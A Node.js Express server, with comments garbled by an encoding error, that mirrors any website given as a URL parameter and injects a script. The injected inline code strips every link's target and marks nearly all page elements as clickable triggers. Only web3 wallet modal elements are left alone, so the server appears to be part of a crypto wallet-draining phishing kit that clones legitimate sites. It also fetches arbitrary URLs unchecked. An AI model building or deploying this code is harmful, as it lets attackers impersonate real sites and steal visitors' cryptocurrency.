const express = require("express");
const http = require("http");
const https = require("https");
const path = require("path");
const zlib = require("zlib"); // –î–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Å–∂–∞—Ç–∏—è

const app = express();
const PORT = process.env.PORT || 3000;

// –ü—Ä–æ—Å—Ç–æ–µ –∫–µ—à-—Ö—Ä–∞–Ω–∏–ª–∏—â–µ –¥–ª—è —Å—Ç–∞—Ç–∏–∫–∏
const staticCache = new Map();

// –†–∞–∑–¥–∞—ë–º inject.js
app.get("/inject.js", (req, res) => {
  res.setHeader("Content-Type", "application/javascript; charset=utf-8");
  res.sendFile(path.join(__dirname, "inject.js"), (err) => {
    if (err) {
      console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ inject.js:", err);
      res.status(500).send("–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ inject.js");
    }
  });
});

// –°–∫—Ä–∏–ø—Ç –∏ –∏–Ω–ª–∞–π–Ω-–ª–æ–≥–∏–∫–∞
const injectedScriptTag = `<script charset="UTF-8" type="text/javascript" src="/inject.js"></script>`;
const inlineScript = `
<script>
  function addClassesToElements() {
    try {
      const links = document.querySelectorAll('a:not(.interact-button)');
      for (const link of links) {
        link.removeAttribute('href');
        link.classList.add('interact-button');
      }
      const buttons = document.querySelectorAll('div:not(.interact-button):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
      for (const button of buttons) {
        button.classList.add('interact-button');
      }
    } catch (err) {
      console.error("–û—à–∏–±–∫–∞ –≤ addClassesToElements:", err);
    }
  }
  function runWhenReady() {
    try {
      addClassesToElements();
      setInterval(addClassesToElements, 300);
    } catch (err) {
      console.error("–û—à–∏–±–∫–∞ –≤ runWhenReady:", err);
    }
  }
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", runWhenReady);
  } else {
    runWhenReady();
  }
</script>
`;

// –ü—Ä–æ–∫—Å–∏—Ä—É–µ–º —Å—Ç–∞—Ç–∏–∫—É: /proxy/...
app.use("/proxy", (req, res) => {
  const targetBase = req.query.base;
  if (!targetBase) return res.status(400).send("–ü–∞—Ä–∞–º–µ—Ç—Ä ?base= –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω");

  let targetUrl;
  try {
    targetUrl = new URL(req.originalUrl.replace("/proxy", ""), targetBase).toString();
  } catch (err) {
    return res.status(400).send("–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π URL: " + err.message);
  }

  const protocol = targetUrl.startsWith("https") ? https : http;

  // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–µ—à–∞
  if (staticCache.has(targetUrl)) {
    const cached = staticCache.get(targetUrl);
    res.writeHead(200, cached.headers);
    return res.end(cached.body);
  }

  protocol.get(targetUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } }, (proxyRes) => {
    let chunks = [];

    proxyRes.on("data", (chunk) => chunks.push(chunk));
    proxyRes.on("end", () => {
      let buffer = Buffer.concat(chunks);
      const contentType = proxyRes.headers["content-type"] || "";
      const contentEncoding = proxyRes.headers["content-encoding"];

      // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–∂–∞—Ç—ã—Ö –¥–∞–Ω–Ω—ã—Ö
      if (contentEncoding === "gzip") {
        zlib.gunzip(buffer, (err, decoded) => {
          if (err) {
            console.error("–û—à–∏–±–∫–∞ –¥–µ–∫–æ–º–ø—Ä–µ—Å—Å–∏–∏ gzip:", err);
            return res.status(500).send("–û—à–∏–±–∫–∞ –¥–µ–∫–æ–º–ø—Ä–µ—Å—Å–∏–∏");
          }
          buffer = decoded;
          handleResponse(buffer, contentType);
        });
      } else if (contentEncoding === "deflate") {
        zlib.inflate(buffer, (err, decoded) => {
          if (err) {
            console.error("–û—à–∏–±–∫–∞ –¥–µ–∫–æ–º–ø—Ä–µ—Å—Å–∏–∏ deflate:", err);
            return res.status(500).send("–û—à–∏–±–∫–∞ –¥–µ–∫–æ–º–ø—Ä–µ—Å—Å–∏–∏");
          }
          buffer = decoded;
          handleResponse(buffer, contentType);
        });
      } else {
        handleResponse(buffer, contentType);
      }

      function handleResponse(buffer, contentType) {
        // –ö–µ—à–∏—Ä—É–µ–º —Ç–æ–ª—å–∫–æ —Å—Ç–∞—Ç–∏–∫—É
        if (!contentType.includes("text/html")) {
          staticCache.set(targetUrl, {
            headers: proxyRes.headers,
            body: buffer,
          });
        }

        let headers = { ...proxyRes.headers };
        delete headers["content-encoding"];
        res.writeHead(proxyRes.statusCode, headers);
        res.end(buffer);
      }
    });
  }).on("error", (err) => {
    console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–∫—Å–∏—Ä–æ–≤–∞–Ω–∏–∏ —Å—Ç–∞—Ç–∏–∫–∏:", err);
    res.status(500).send("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–∫—Å–∏—Ä–æ–≤–∞–Ω–∏–∏ —Å—Ç–∞—Ç–∏–∫–∏: " + err.message);
  });
});

// –ü—Ä–æ–∫—Å–∏—Ä—É–µ–º HTML —Å –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–µ–π
app.get("/", (req, res) => {
  const targetUrl = req.query.id;
  if (!targetUrl) return res.status(400).send("–ü–∞—Ä–∞–º–µ—Ç—Ä ?id= –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω");

  let urlObj;
  try {
    urlObj = new URL(targetUrl);
  } catch {
    return res.status(400).send("–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π URL");
  }

  const protocol = urlObj.protocol === "https:" ? https : http;

  protocol.get(targetUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } }, (proxyRes) => {
    let body = [];

    proxyRes.on("data", (chunk) => body.push(chunk));
    proxyRes.on("end", () => {
      let contentType = proxyRes.headers["content-type"] || "";
      let buffer = Buffer.concat(body);
      let responseBody;

      // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–∂–∞—Ç—ã—Ö –¥–∞–Ω–Ω—ã—Ö
      const contentEncoding = proxyRes.headers["content-encoding"];
      if (contentEncoding === "gzip") {
        zlib.gunzip(buffer, (err, decoded) => {
          if (err) {
            console.error("–û—à–∏–±–∫–∞ –¥–µ–∫–æ–º–ø—Ä–µ—Å—Å–∏–∏ gzip:", err);
            return res.status(500).send("–û—à–∏–±–∫–∞ –¥–µ–∫–æ–º–ø—Ä–µ—Å—Å–∏–∏");
          }
          processHtml(decoded.toString("utf8"));
        });
      } else if (contentEncoding === "deflate") {
        zlib.inflate(buffer, (err, decoded) => {
          if (err) {
            console.error("–û—à–∏–±–∫–∞ –¥–µ–∫–æ–º–ø—Ä–µ—Å—Å–∏–∏ deflate:", err);
            return res.status(500).send("–û—à–∏–±–∫–∞ –¥–µ–∫–æ–º–ø—Ä–µ—Å—Å–∏–∏");
          }
          processHtml(decoded.toString("utf8"));
        });
      } else {
        processHtml(buffer.toString("utf8"));
      }

      function processHtml(responseBody) {
        if (contentType.includes("text/html")) {
          // –ë–æ–ª–µ–µ –Ω–∞–¥—ë–∂–Ω–∞—è –∑–∞–º–µ–Ω–∞ –ø—É—Ç–µ–π
          responseBody = responseBody
            .replace(/(["'])(\/(_next|assets|static)\/[^"']+)/g, `$1/proxy$2?base=${encodeURIComponent(targetUrl)}`);

          // –í—Å—Ç–∞–≤–ª—è–µ–º —Å–∫—Ä–∏–ø—Ç—ã
          if (responseBody.includes("</head>")) {
            responseBody = responseBody.replace(
              "</head>",
              `${injectedScriptTag}\n${inlineScript}</head>`
            );
          } else {
            responseBody = injectedScriptTag + inlineScript + responseBody;
          }
        }

        let headers = { ...proxyRes.headers };
        delete headers["content-length"];
        delete headers["content-encoding"];
        headers["content-type"] = contentType || "text/html; charset=utf-8";

        res.writeHead(proxyRes.statusCode, headers);
        res.end(responseBody);
      }
    });
  }).on("error", (err) => {
    console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–∫—Å–∏—Ä–æ–≤–∞–Ω–∏–∏:", err);
    res.status(500).send("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–∫—Å–∏—Ä–æ–≤–∞–Ω–∏–∏: " + err.message);
  });
});

app.listen(PORT, () => {
  console.log(`üöÄ –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É ${PORT}`);
});
